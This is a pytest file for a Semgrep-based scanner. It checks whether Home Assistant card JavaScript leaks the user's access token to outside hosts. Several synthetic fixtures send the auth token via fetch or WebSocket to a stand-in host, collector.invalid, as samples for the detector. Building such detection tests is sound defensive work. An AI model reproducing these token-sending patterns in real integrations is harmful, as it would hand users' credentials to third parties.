"""(0.15) A token sent through a helper, found in the full Marketplace run: the address
is not the helper's first parameter, the helper is a method or a prototype method, or it
sits in a classic script; and HA's own login message over HA's websocket.

Synthetic: every name is made up, every outside host is .invalid. Nothing runs; Semgrep
parses the files and the rest is a text read.
"""

from __future__ import annotations

import shutil
import textwrap
from pathlib import Path

import pytest

from sniff_test.analyzers import semgrep
from sniff_test.models import Target, TargetKind

pytestmark = pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")


def _scan(tmp_path: Path, files: dict[str, str]) -> list[tuple[str, int]]:
    root = tmp_path / "custom_components" / "acme_power"
    root.mkdir(parents=True)
    (root / "manifest.json").write_text('{"domain": "acme_power", "name": "Acme"}')
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(textwrap.dedent(text))
    target = Target(source=str(root), kind=TargetKind.INTEGRATION, root=root, domain="acme_power")
    work = tmp_path / "work"
    work.mkdir()
    result = semgrep.run(target, work)
    return sorted((f.file, f.line) for f in result.findings if f.rule_id == "card-token-exfil")


# --- the address in the second place -----------------------------------------------------

SECOND = """\
    export async function authFetch(hass, url, init) {
      const auth = hass.auth;
      return fetch(url, { ...init, headers: { Authorization: auth.data.access_token } });
    }
    export async function upload(hass, body) {
      return authFetch(hass, "/api/acme_power/upload", { method: "POST", body });
    }
    """


def test_a_helper_with_the_address_second_is_followed(tmp_path):
    assert _scan(tmp_path, {"www/api.js": SECOND}) == []


@pytest.mark.parametrize(
    "extra",
    [
        'authFetch(hass, "https://collector.invalid/c", {});',
        "authFetch(hass, where, {});",
        "authFetch(hass);",
        "const f = authFetch;",
        "import { authFetch as g } from './api.js';",
    ],
)
def test_one_unproven_use_keeps_it(tmp_path, extra):
    other = (
        f"import {{ authFetch }} from './api.js';\nexport function x(hass, where) {{ {extra} }}\n"
    )
    assert _scan(tmp_path, {"www/api.js": SECOND, "www/other.js": other}) == [("www/api.js", 3)]


# --- methods, prototype methods, guards in a helper -----------------------------------------

METHOD = """\
    class AcmeCard extends HTMLElement {
      async _apiFetch(path, options = {}) {
        const token = this._hass.auth.data.access_token;
        const base = `${location.protocol}//${location.host}`;
        return fetch(`${base}${path}`, { ...options, headers: { Authorization: token } });
      }
      async _apiGet(path) {
        const url = path.startsWith("/") ? path : `/api/${path}`;
        return fetch(url, { headers: { Authorization: this._hass.auth.data.access_token } });
      }
      async load(id) {
        await this._apiFetch("/api/acme_power/list");
        await this._apiFetch(`/api/acme_power/item/${id}`, { method: "DELETE" });
        await this._apiGet("/api/acme_power/state");
        return this._apiGet("/api/acme_power/other");
      }
    }
    customElements.define("acme-card", AcmeCard);
    """


def test_a_method_whose_calls_all_stay_on_ha_is_no_finding(tmp_path):
    assert _scan(tmp_path, {"www/card.js": METHOD}) == []


@pytest.mark.parametrize(
    "extra,lines",
    [
        ('await this._apiFetch("@collector.invalid/c");', [5]),
        ('await this._apiGet("//collector.invalid/c");', [9]),
        ('await this["_apiFetch"]("@collector.invalid/c");', [5]),
        ("const f = this._apiGet;", [9]),
        ("await this._apiGet(id);", [9]),
    ],
)
def test_one_bad_call_or_escape_keeps_the_method(tmp_path, extra, lines):
    code = METHOD.replace(
        '    return this._apiGet("/api', f'    {extra}\n        return this._apiGet("/api'
    )
    assert _scan(tmp_path, {"www/card.js": code}) == [("www/card.js", n) for n in lines]


def test_a_call_from_another_script_of_the_app_counts(tmp_path):
    other = 'document.querySelector("acme-card")._apiFetch("@collector.invalid/c");\n'
    assert _scan(tmp_path, {"www/card.js": METHOD, "www/other.js": other}) == [("www/card.js", 5)]


PROTO = """\
    function C() {}
    C.prototype._apiFetch = function (path, init = {}) {
      const token = this._hass.auth.data.access_token;
      return fetch(path, Object.assign({}, init, { headers: { Authorization: token } }));
    };
    C.prototype.load = function () {
      return this._apiFetch("/api/acme_power/x");
    };
    """


def test_a_prototype_method_in_a_classic_script_is_followed(tmp_path):
    assert _scan(tmp_path, {"www/card.js": PROTO}) == []
    bad = PROTO + 'new C()._apiFetch("https://collector.invalid/c");\n'
    assert _scan(tmp_path / "b", {"www/card.js": bad}) == [("www/card.js", 4)]


# --- HA's websocket ---------------------------------------------------------------------------

SOCKET = """\
    const mixin = {
      connect() {
        const scheme = window.location.protocol === "https:" ? "wss:" : "ws:";
        const wsUrl = `${scheme}//${window.location.host}/api/websocket`;
        this.ws = new WebSocket(wsUrl);
      },
      close() { this.ws = null; },
      auth(hass) {
        const token = hass.auth.data.access_token;
        this.ws.send(JSON.stringify({ type: "auth", access_token: token }));
      },
    };
    """


def test_the_login_message_over_has_own_websocket_is_no_finding(tmp_path):
    assert _scan(tmp_path, {"www/card.js": SOCKET}) == []


@pytest.mark.parametrize(
    "change",
    [
        ("`${scheme}//${window.location.host}/api/websocket`", '"wss://collector.invalid/ws"'),
        ("this.ws = null;", 'this.ws = new WebSocket("wss://collector.invalid/ws");'),
        ("close() { this.ws = null; },", "close() { this.ws = null; },\n  steal(o) { o.ws = 1; },"),
    ],
)
def test_a_socket_that_may_lead_elsewhere_keeps_it(tmp_path, change):
    code = SOCKET.replace(*change)
    assert code != SOCKET
    line = textwrap.dedent(code)[: textwrap.dedent(code).index("this.ws.send")].count("\n") + 1
    assert _scan(tmp_path, {"www/card.js": code}) == [("www/card.js", line)]


def test_a_socket_from_has_websocket_library(tmp_path):
    lib = (
        "function q(t){let e=t.auth,o=e.wsUrl;function n(r){let c=new WebSocket(o),"
        "v=async m=>{c.send(JSON.stringify({type:'auth',access_token:e.accessToken}))};"
        "c.addEventListener('open',v)}return n(1)}\nexport{q as c};\n"
    )
    assert _scan(tmp_path, {"www/haws.js": lib}) == []
    bad = lib.replace("o=e.wsUrl", "o='wss://collector.invalid/ws'")
    assert _scan(tmp_path / "b", {"www/haws.js": bad}) == [("www/haws.js", 1)]


def test_a_new_variable_of_the_same_name_in_a_block(tmp_path):
    # after the request, in an inner block: another variable, the parameter is unchanged
    later = (
        "async function V(e,t,n){let r={};e.auth&&(r.Authorization=e.auth.accessToken);"
        "let a=await fetch(t,{headers:r});if(!a.ok){let c=1,t=c?'x':'y';throw t}return a}\n"
        "export function up(e,i){return V(e,`/api/acme_power/p/${i}`,{})}\n"
    )
    assert _scan(tmp_path, {"www/p.js": later}) == []
    # around the request: the request uses that other variable, whatever callers pass
    around = (
        "async function V(e,t,n){if(n){let t='https://collector.invalid/c';"
        "return fetch(t,{headers:{Authorization:e.auth.accessToken}})}}\n"
        "export function up(e){return V(e,'/api/acme_power/p',1)}\n"
    )
    assert _scan(tmp_path / "b", {"www/p.js": around}) == [("www/p.js", 1)]
    # `var` is the parameter itself: changed
    var = later.replace("let c=1,t=", "var c=1;t=")
    assert _scan(tmp_path / "c", {"www/p.js": var}) == [("www/p.js", 1)]
